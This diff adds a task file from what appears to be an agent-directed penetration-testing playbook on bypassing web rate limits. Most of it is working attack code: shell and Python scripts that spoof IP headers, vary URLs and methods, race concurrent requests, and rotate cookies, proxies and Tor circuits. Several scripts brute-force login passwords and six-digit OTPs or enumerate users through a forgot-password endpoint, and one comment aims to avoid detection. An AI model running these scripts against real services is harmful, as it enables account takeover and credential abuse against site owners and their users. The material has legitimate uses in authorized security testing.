@@ -1,0 +1,842 @@
+================================================================================
+TASK 71 · RATE-LIMIT BYPASS
+================================================================================
+Covers testing_toolkit.txt Phase 8 Step 29
+Header rotation, IP spoofing, concurrent threads, endpoint variations.
+
+OBJECTIVE:
+- Bypass rate limits via header manipulation
+- Rotate through IP spoofing headers
+- Use concurrent threads to race condition limits
+- Exploit endpoint variation (case, encoding)
+- Test per-endpoint vs global rate limits
+- Enumerate accounts/credentials despite limits
+
+================================================================================
+INPUTS
+================================================================================
+outputs/api_endpoints_from_openapi.txt     ← API endpoints
+outputs/live_base_urls.txt                 ← Live targets
+outputs/url_corpus_all_in_scope.txt        ← URL corpus (grep for login/auth endpoints)
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/ratelimit/
+├── bypass_successful.txt           ← Working bypass techniques
+├── header_rotation_results.txt     ← IP header bypass results
+├── endpoint_variation_results.txt  ← URL manipulation results
+├── concurrent_results.txt          ← Race condition results
+└── ratelimit_log.txt               ← Full execution log
+
+================================================================================
+🧠 RATE-LIMIT BYPASS FUNDAMENTALS 🧠
+================================================================================
+
+───────────────────────────────────────
+How Rate Limits Work
+───────────────────────────────────────
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ Tracking Method     │ Bypass Strategy                                      │
+├─────────────────────┼──────────────────────────────────────────────────────┤
+│ IP Address          │ X-Forwarded-For, proxy rotation                      │
+│ User Account        │ Multiple accounts, null session                      │
+│ Session/Cookie      │ Cookie rotation, clear session                       │
+│ API Key             │ Key rotation, no-key requests                        │
+│ Endpoint-specific   │ URL variations, different methods                    │
+│ Global              │ Distributed attacks, slow and steady                 │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+COMMON WEAKNESSES:
+- Trust X-Forwarded-For without validation
+- Rate limit only on exact URL match
+- Reset limit on any response (including errors)
+- No limit on certain HTTP methods
+- Different limits per endpoint (login vs API)
+
+================================================================================
+PHASE 1: IP SPOOFING HEADERS
+================================================================================
+
+───────────────────────────────────────
+1.1 IP Override Headers
+───────────────────────────────────────
+# Headers that servers may trust for client IP
+
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Host: 127.0.0.1
+X-Forwarded-Host: 127.0.0.1
+True-Client-IP: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1        # Cloudflare
+X-Azure-ClientIP: 127.0.0.1        # Azure
+X-Azure-SocketIP: 127.0.0.1
+Fastly-Client-IP: 127.0.0.1        # Fastly
+Akamai-Origin-Hop: 127.0.0.1       # Akamai
+X-Cluster-Client-IP: 127.0.0.1
+
+───────────────────────────────────────
+1.2 Basic Header Rotation Script
+───────────────────────────────────────
+#!/bin/bash
+# ip_header_bypass.sh
+
+TARGET="$1"
+ENDPOINT="$2"
+REQUESTS=${3:-100}
+
+HEADERS=(
+    "X-Forwarded-For"
+    "X-Real-IP"
+    "X-Originating-IP"
+    "X-Remote-IP"
+    "X-Client-IP"
+    "True-Client-IP"
+    "CF-Connecting-IP"
+    "X-Cluster-Client-IP"
+)
+
+echo "[*] Testing rate-limit bypass via IP headers"
+echo "[*] Target: $TARGET$ENDPOINT"
+
+for header in "${HEADERS[@]}"; do
+    echo ""
+    echo "[*] Testing header: $header"
+    
+    success=0
+    for i in $(seq 1 $REQUESTS); do
+        # Generate random IP
+        ip="$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))"
+        
+        code=$(curl -s -o /dev/null -w "%{http_code}" \
+            "$TARGET$ENDPOINT" \
+            -H "$header: $ip")
+        
+        if [ "$code" = "200" ] || [ "$code" = "401" ]; then
+            ((success++))
+        elif [ "$code" = "429" ]; then
+            echo "    [!] Rate limited at request $i"
+            break
+        fi
+    done
+    
+    if [ $success -eq $REQUESTS ]; then
+        echo "    [+] BYPASS: $header allows unlimited requests!"
+        echo "$header" >> outputs/ratelimit/bypass_successful.txt
+    fi
+done
+
+───────────────────────────────────────
+1.3 Multi-Header Rotation
+───────────────────────────────────────
+#!/bin/bash
+# multi_header_rotation.sh
+
+TARGET="$1"
+
+# Rotate through multiple headers simultaneously
+for i in $(seq 1 1000); do
+    ip1="$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))"
+    ip2="$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))"
+    
+    curl -s "$TARGET/api/login" \
+        -H "X-Forwarded-For: $ip1" \
+        -H "X-Real-IP: $ip2" \
+        -H "X-Originating-IP: 10.0.0.$i" \
+        -d "user=admin&pass=test$i"
+done
+
+───────────────────────────────────────
+1.4 X-Forwarded-For Chaining
+───────────────────────────────────────
+# Some parsers take first IP, some take last
+
+# First IP (common)
+X-Forwarded-For: 1.2.3.4, 10.0.0.1, 192.168.1.1
+
+# Last IP 
+X-Forwarded-For: 10.0.0.1, 192.168.1.1, 1.2.3.4
+
+# Double header (some frameworks merge, some take first)
+curl "$TARGET/api/endpoint" \
+    -H "X-Forwarded-For: 1.1.1.1" \
+    -H "X-Forwarded-For: 2.2.2.2"
+
+───────────────────────────────────────
+1.5 Localhost/Internal IP Bypass
+───────────────────────────────────────
+# Internal IPs often whitelisted from rate limits
+
+INTERNAL_IPS=(
+    "127.0.0.1"
+    "localhost"
+    "0.0.0.0"
+    "10.0.0.1"
+    "172.16.0.1"
+    "192.168.1.1"
+    "::1"
+    "0:0:0:0:0:0:0:1"
+)
+
+for ip in "${INTERNAL_IPS[@]}"; do
+    echo "[*] Testing internal IP: $ip"
+    
+    for i in $(seq 1 50); do
+        curl -s "$TARGET/api/login" \
+            -H "X-Forwarded-For: $ip" \
+            -d "user=admin&pass=test$i"
+    done
+done
+
+================================================================================
+PHASE 2: ENDPOINT VARIATION
+================================================================================
+
+───────────────────────────────────────
+2.1 URL Case Variation
+───────────────────────────────────────
+# Rate limits often match exact URL
+# Different cases may bypass
+
+VARIATIONS=(
+    "/api/login"
+    "/API/login"
+    "/Api/Login"
+    "/API/LOGIN"
+    "/api/LOGIN"
+    "/Api/login"
+)
+
+for url in "${VARIATIONS[@]}"; do
+    echo "[*] Testing: $url"
+    
+    success=0
+    for i in $(seq 1 20); do
+        code=$(curl -s -o /dev/null -w "%{http_code}" \
+            "$TARGET$url" -d "test=test")
+        [ "$code" != "429" ] && ((success++))
+    done
+    
+    echo "    Successful: $success/20"
+done
+
+───────────────────────────────────────
+2.2 URL Encoding Bypass
+───────────────────────────────────────
+# Encoded URLs may bypass rate limit matching
+
+ENCODED_URLS=(
+    "/api/login"
+    "/api%2flogin"
+    "/api%2Flogin"
+    "/%61%70%69/login"           # "api" encoded
+    "/api/login%00"              # Null byte
+    "/api/login%20"              # Trailing space
+    "/api/login/"                # Trailing slash
+    "/api//login"                # Double slash
+    "/api/./login"               # Dot segment
+    "/api/foo/../login"          # Path traversal normalized
+    "/api/login?"                # Empty query
+    "/api/login#"                # Fragment
+)
+
+for url in "${ENCODED_URLS[@]}"; do
+    echo "[*] Testing: $url"
+    code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$url")
+    echo "    Response: $code"
+done
+
+───────────────────────────────────────
+2.3 HTTP Method Variation
+───────────────────────────────────────
+# Rate limits may only apply to POST, not GET or PUT
+
+METHODS="GET POST PUT PATCH DELETE HEAD OPTIONS"
+
+for method in $METHODS; do
+    echo "[*] Testing $method on /api/login"
+    
+    success=0
+    for i in $(seq 1 30); do
+        code=$(curl -s -o /dev/null -w "%{http_code}" \
+            -X $method "$TARGET/api/login" \
+            -d "user=admin&pass=test$i")
+        [ "$code" != "429" ] && ((success++))
+    done
+    
+    echo "    $method: $success/30 not rate limited"
+done
+
+───────────────────────────────────────
+2.4 Parameter-Based Variation
+───────────────────────────────────────
+# Adding parameters may create different rate limit bucket
+
+# Original (rate limited after 10)
+POST /api/login
+user=admin&pass=test
+
+# With extra param (new bucket?)
+POST /api/login
+user=admin&pass=test&_=1234
+
+# With array notation
+POST /api/login
+user[]=admin&pass[]=test
+
+# With JSON body (different parser?)
+POST /api/login
+Content-Type: application/json
+{"user": "admin", "pass": "test"}
+
+================================================================================
+PHASE 3: CONCURRENT REQUESTS (RACE CONDITION)
+================================================================================
+
+───────────────────────────────────────
+3.1 Understanding Race Condition Bypass
+───────────────────────────────────────
+# Rate limit check:
+# 1. Read counter from DB/cache
+# 2. Check if < limit
+# 3. Increment counter
+# 4. Process request
+
+# Race window: Between check (2) and increment (3)
+# If requests arrive simultaneously, all may pass check
+
+───────────────────────────────────────
+3.2 GNU Parallel Race Attack
+───────────────────────────────────────
+#!/bin/bash
+# race_condition_bypass.sh
+
+TARGET="$1"
+CONCURRENT=${2:-50}
+
+# Create request function
+request() {
+    curl -s -o /dev/null -w "%{http_code}" \
+        "$TARGET/api/login" \
+        -d "user=admin&pass=password$1"
+}
+export -f request
+export TARGET
+
+# Fire concurrent requests
+echo "[*] Sending $CONCURRENT concurrent requests..."
+
+results=$(seq 1 $CONCURRENT | parallel -j $CONCURRENT request)
+
+# Count successes
+success=$(echo "$results" | grep -c "200\|401")
+ratelimited=$(echo "$results" | grep -c "429")
+
+echo "[*] Results:"
+echo "    Successful: $success"
+echo "    Rate limited: $ratelimited"
+
+if [ $success -gt 10 ]; then
+    echo "[!] Race condition bypass likely!"
+fi
+
+───────────────────────────────────────
+3.3 Turbo Intruder (Burp Extension)
+───────────────────────────────────────
+# Turbo Intruder script for race condition
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=50,
+                           requestsPerConnection=1,
+                           pipeline=False)
+    
+    for i in range(100):
+        engine.queue(target.req, str(i))
+
+def handleResponse(req, interesting):
+    if '429' not in req.response:
+        table.add(req)
+
+───────────────────────────────────────
+3.4 Python Async Race Attack
+───────────────────────────────────────
+#!/usr/bin/env python3
+# race_attack.py
+
+import asyncio
+import aiohttp
+import sys
+
+async def send_request(session, url, data, i):
+    try:
+        async with session.post(url, data=data) as response:
+            return response.status
+    except:
+        return 0
+
+async def race_attack(url, count=100):
+    async with aiohttp.ClientSession() as session:
+        tasks = []
+        for i in range(count):
+            data = {"user": "admin", "pass": f"test{i}"}
+            tasks.append(send_request(session, url, data, i))
+        
+        # Fire all at once
+        results = await asyncio.gather(*tasks)
+        
+        success = sum(1 for r in results if r in [200, 401, 403])
+        limited = sum(1 for r in results if r == 429)
+        
+        print(f"[*] Concurrent results:")
+        print(f"    Passed: {success}")
+        print(f"    Rate limited: {limited}")
+        
+        return success > 10
+
+if __name__ == "__main__":
+    url = sys.argv[1] if len(sys.argv) > 1 else "http://target/api/login"
+    asyncio.run(race_attack(url))
+
+───────────────────────────────────────
+3.5 Last-Byte Sync Attack
+───────────────────────────────────────
+# Hold requests until all connections ready, then release together
+
+#!/usr/bin/env python3
+# last_byte_sync.py
+
+import socket
+import threading
+
+def send_request_sync(host, port, request, barrier, results, idx):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((host, port))
+    
+    # Send all but last byte
+    sock.send(request[:-1])
+    
+    # Wait for all threads
+    barrier.wait()
+    
+    # Send last byte simultaneously
+    sock.send(request[-1:])
+    
+    # Get response
+    response = sock.recv(4096)
+    results[idx] = response
+    sock.close()
+
+# Usage
+threads = 50
+barrier = threading.Barrier(threads)
+results = [None] * threads
+
+request = b"POST /api/login HTTP/1.1\r\nHost: target.com\r\nContent-Length: 30\r\n\r\nuser=admin&pass=test12345678X"
+
+for i in range(threads):
+    t = threading.Thread(target=send_request_sync, 
+        args=("target.com", 80, request, barrier, results, i))
+    t.start()
+
+================================================================================
+PHASE 4: SESSION/COOKIE MANIPULATION
+================================================================================
+
+───────────────────────────────────────
+4.1 Cookie Rotation
+───────────────────────────────────────
+# If rate limit tied to session cookie, rotate cookies
+
+#!/bin/bash
+# cookie_rotation.sh
+
+TARGET="$1"
+
+for i in $(seq 1 100); do
+    # Request without cookie (new session each time)
+    curl -s "$TARGET/api/login" \
+        -d "user=admin&pass=test$i"
+    
+    # OR with random session ID
+    curl -s "$TARGET/api/login" \
+        -H "Cookie: session=$(openssl rand -hex 16)" \
+        -d "user=admin&pass=test$i"
+done
+
+───────────────────────────────────────
+4.2 No-Auth Requests
+───────────────────────────────────────
+# If rate limit per-user, try unauthenticated
+
+# Authenticated (tied to user, rate limited)
+curl "$TARGET/api/check" -H "Authorization: Bearer $TOKEN"
+
+# Unauthenticated (may have no limit or separate limit)
+curl "$TARGET/api/check"
+
+───────────────────────────────────────
+4.3 Multiple Account Rotation
+───────────────────────────────────────
+# If rate limit per-account, rotate through accounts
+
+TOKENS=(
+    "token_user1"
+    "token_user2"
+    "token_user3"
+)
+
+for i in $(seq 1 300); do
+    # Round-robin through tokens
+    token=${TOKENS[$((i % ${#TOKENS[@]}))]}
+    
+    curl -s "$TARGET/api/sensitive" \
+        -H "Authorization: Bearer $token"
+done
+
+================================================================================
+PHASE 5: TIMING-BASED BYPASS
+================================================================================
+
+───────────────────────────────────────
+5.1 Slow Requests (Stay Under Limit)
+───────────────────────────────────────
+# If limit is "10 requests per second"
+# Send 9 requests per second indefinitely
+
+#!/bin/bash
+# slow_brute.sh
+
+TARGET="$1"
+WORDLIST="$2"
+DELAY=${3:-0.11}  # Just under 10/sec
+
+while read password; do
+    curl -s "$TARGET/api/login" \
+        -d "user=admin&pass=$password" &
+    sleep $DELAY
+done < "$WORDLIST"
+
+───────────────────────────────────────
+5.2 Limit Reset Exploitation
+───────────────────────────────────────
+# Find what resets the rate limit
+
+# Wait for window reset
+# If 10 requests per minute, wait 60 seconds
+
+for batch in $(seq 1 10); do
+    echo "[*] Batch $batch"
+    
+    for i in $(seq 1 9); do
+        curl -s "$TARGET/api/login" -d "pass=test$i"
+    done
+    
+    echo "[*] Waiting for reset..."
+    sleep 60
+done
+
+───────────────────────────────────────
+5.3 Error Response Exploitation
+───────────────────────────────────────
+# Some rate limits don't count error responses
+
+# Force errors that don't count
+curl "$TARGET/api/login" -d "user="  # Missing param
+curl "$TARGET/api/login" -d ""       # Empty body
+curl "$TARGET/api/login" -H "Content-Type: invalid"
+
+# Check if counter reset
+
+================================================================================
+PHASE 6: DISTRIBUTED BYPASS
+================================================================================
+
+───────────────────────────────────────
+6.1 Proxy Rotation
+───────────────────────────────────────
+#!/bin/bash
+# proxy_rotation.sh
+
+TARGET="$1"
+PROXY_LIST="proxies.txt"  # One proxy per line
+
+while read password; do
+    # Get random proxy
+    proxy=$(shuf -n1 "$PROXY_LIST")
+    
+    curl -s "$TARGET/api/login" \
+        --proxy "$proxy" \
+        -d "user=admin&pass=$password"
+done < wordlist.txt
+
+───────────────────────────────────────
+6.2 Tor Circuit Rotation
+───────────────────────────────────────
+# Each request through different Tor circuit
+
+for i in $(seq 1 100); do
+    # Get new circuit (requires Tor control)
+    echo -e 'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\nQUIT' | nc 127.0.0.1 9051
+    sleep 1
+    
+    curl -s "$TARGET/api/login" \
+        --socks5 127.0.0.1:9050 \
+        -d "user=admin&pass=test$i"
+done
+
+───────────────────────────────────────
+6.3 Cloud Function Distribution
+───────────────────────────────────────
+# Deploy to multiple regions, each has different IP
+
+# Lambda/Cloud Function per request
+# Each invocation = new IP
+
+# Serverless framework example:
+# Deploy same function to 10 regions
+# Round-robin requests through regions
+
+================================================================================
+PHASE 7: SPECIFIC ATTACK SCENARIOS
+================================================================================
+
+───────────────────────────────────────
+7.1 Login Brute-Force Bypass
+───────────────────────────────────────
+#!/bin/bash
+# login_bruteforce_bypass.sh
+
+TARGET="$1"
+USERNAME="$2"
+WORDLIST="$3"
+
+echo "[*] Brute-forcing $USERNAME with rate-limit bypass"
+
+i=0
+while read password; do
+    ((i++))
+    
+    # Rotate IP every request
+    ip="$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))"
+    
+    # Try URL variation every 10 requests
+    endpoint="/api/login"
+    case $((i % 5)) in
+        0) endpoint="/API/login" ;;
+        1) endpoint="/api/Login" ;;
+        2) endpoint="/api/login/" ;;
+        3) endpoint="/api/login?" ;;
+    esac
+    
+    response=$(curl -s "$TARGET$endpoint" \
+        -H "X-Forwarded-For: $ip" \
+        -H "X-Real-IP: $ip" \
+        -d "username=$USERNAME&password=$password")
+    
+    if echo "$response" | grep -qi "success\|token\|welcome"; then
+        echo "[+] FOUND: $password"
+        break
+    fi
+    
+    # Small delay to avoid detection
+    [ $((i % 100)) -eq 0 ] && sleep 1
+    
+done < "$WORDLIST"
+
+───────────────────────────────────────
+7.2 OTP Brute-Force Bypass
+───────────────────────────────────────
+#!/bin/bash
+# otp_bruteforce.sh
+
+TARGET="$1"
+SESSION="$2"
+
+echo "[*] Brute-forcing 6-digit OTP"
+
+for code in $(seq -w 000000 999999); do
+    # Rotate IP
+    ip="$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))"
+    
+    response=$(curl -s "$TARGET/api/verify-otp" \
+        -H "X-Forwarded-For: $ip" \
+        -H "Cookie: session=$SESSION" \
+        -d "code=$code")
+    
+    if echo "$response" | grep -qi "success\|verified"; then
+        echo "[+] Valid OTP: $code"
+        break
+    fi
+    
+    # Rate limit bypass via new session every 10 tries
+    if [ $((10#$code % 10)) -eq 0 ]; then
+        # Get new session
+        SESSION=$(curl -s -c - "$TARGET/api/resend-otp" | grep session | awk '{print $NF}')
+    fi
+done
+
+───────────────────────────────────────
+7.3 API Enumeration Bypass
+───────────────────────────────────────
+#!/bin/bash
+# enum_bypass.sh
+
+TARGET="$1"
+
+echo "[*] User enumeration with rate-limit bypass"
+
+while read email; do
+    ip="$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))"
+    
+    response=$(curl -s "$TARGET/api/forgot-password" \
+        -H "X-Forwarded-For: $ip" \
+        -d "email=$email")
+    
+    if echo "$response" | grep -qi "email sent\|check your"; then
+        echo "[+] Valid user: $email"
+        echo "$email" >> valid_users.txt
+    fi
+done < emails.txt
+
+================================================================================
+PHASE 8: COMPLETE BYPASS SCRIPT
+================================================================================
+
+#!/bin/bash
+# complete_ratelimit_bypass.sh
+
+TARGET="$1"
+ENDPOINT=${2:-"/api/login"}
+OUTPUT_DIR="outputs/ratelimit"
+
+mkdir -p "$OUTPUT_DIR"
+
+echo "═══════════════════════════════════════════════════════════════"
+echo " Rate-Limit Bypass Testing"
+echo " Target: $TARGET$ENDPOINT"
+echo "═══════════════════════════════════════════════════════════════"
+
+# TEST 1: Baseline (no bypass)
+echo ""
+echo "[TEST 1] Baseline - No Bypass"
+echo "───────────────────────────────────────"
+
+baseline_success=0
+for i in $(seq 1 30); do
+    code=$(curl -s -o /dev/null -w "%{http_code}" \
+        "$TARGET$ENDPOINT" -d "test=$i")
+    [ "$code" != "429" ] && ((baseline_success++))
+done
+echo "[*] Baseline: $baseline_success/30 requests passed"
+
+# TEST 2: IP Header Rotation
+echo ""
+echo "[TEST 2] IP Header Rotation"
+echo "───────────────────────────────────────"
+
+HEADERS=("X-Forwarded-For" "X-Real-IP" "X-Originating-IP" "True-Client-IP")
+
+for header in "${HEADERS[@]}"; do
+    success=0
+    for i in $(seq 1 30); do
+        ip="$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))"
+        code=$(curl -s -o /dev/null -w "%{http_code}" \
+            "$TARGET$ENDPOINT" -H "$header: $ip" -d "test=$i")
+        [ "$code" != "429" ] && ((success++))
+    done
+    
+    if [ $success -gt $baseline_success ]; then
+        echo "[!] $header: $success/30 (BYPASS!)"
+        echo "$header" >> "$OUTPUT_DIR/bypass_successful.txt"
+    else
+        echo "[*] $header: $success/30"
+    fi
+done
+
+# TEST 3: URL Variations
+echo ""
+echo "[TEST 3] URL Variations"
+echo "───────────────────────────────────────"
+
+VARIATIONS=("$ENDPOINT" "${ENDPOINT^^}" "$ENDPOINT/" "$ENDPOINT?")
+
+for url in "${VARIATIONS[@]}"; do
+    success=0
+    for i in $(seq 1 30); do
+        code=$(curl -s -o /dev/null -w "%{http_code}" \
+            "$TARGET$url" -d "test=$i")
+        [ "$code" != "429" ] && ((success++))
+    done
+    echo "[*] $url: $success/30"
+done
+
+# TEST 4: Concurrent Race
+echo ""
+echo "[TEST 4] Concurrent Race Condition"
+echo "───────────────────────────────────────"
+
+if command -v parallel &> /dev/null; then
+    concurrent_test() {
+        curl -s -o /dev/null -w "%{http_code}" \
+            "$TARGET$ENDPOINT" -d "test=$1"
+    }
+    export -f concurrent_test
+    export TARGET ENDPOINT
+    
+    results=$(seq 1 50 | parallel -j 50 concurrent_test)
+    race_success=$(echo "$results" | grep -cv "429")
+    echo "[*] Race condition: $race_success/50 passed concurrently"
+fi
+
+echo ""
+echo "[*] Results saved to $OUTPUT_DIR"
+
+================================================================================
+🧠 YOU ARE AN INTELLIGENT AGENT 🧠
+================================================================================
+
+BYPASS PRIORITY:
+────────────────
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ Priority │ Technique              │ Success Rate                           │
+├──────────┼────────────────────────┼────────────────────────────────────────┤
+│ 1        │ X-Forwarded-For        │ Very High (trusted by many proxies)    │
+│ 2        │ URL Case Variation     │ High (exact match rate limits)         │
+│ 3        │ Race Condition         │ Medium (timing-dependent)              │
+│ 4        │ URL Encoding           │ Medium (normalization issues)          │
+│ 5        │ Cookie Rotation        │ Medium (session-based limits)          │
+│ 6        │ Proxy Distribution     │ High (but requires infrastructure)     │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+CRITICAL CHECKS:
+────────────────
+□ Test all IP spoofing headers
+□ Try URL case and encoding variations
+□ Test concurrent/race condition attacks
+□ Check HTTP method differences
+□ Try session/cookie rotation
+□ Test with and without authentication
+
+================================================================================
+TOOLS REFERENCE
+================================================================================
+- Turbo Intruder (Burp): Race condition testing
+- GNU Parallel: Concurrent request firing
+- proxychains: Proxy rotation
+- Tor: IP rotation via circuits
+
+================================================================================
+SUCCESS CRITERIA
+================================================================================
+✓ All IP spoofing headers tested
+✓ URL variations tested (case, encoding, trailing)
+✓ Race condition with concurrent requests tested
+✓ HTTP method variations tested
+✓ Session/cookie manipulation tested
+✓ Working bypass techniques documented
+
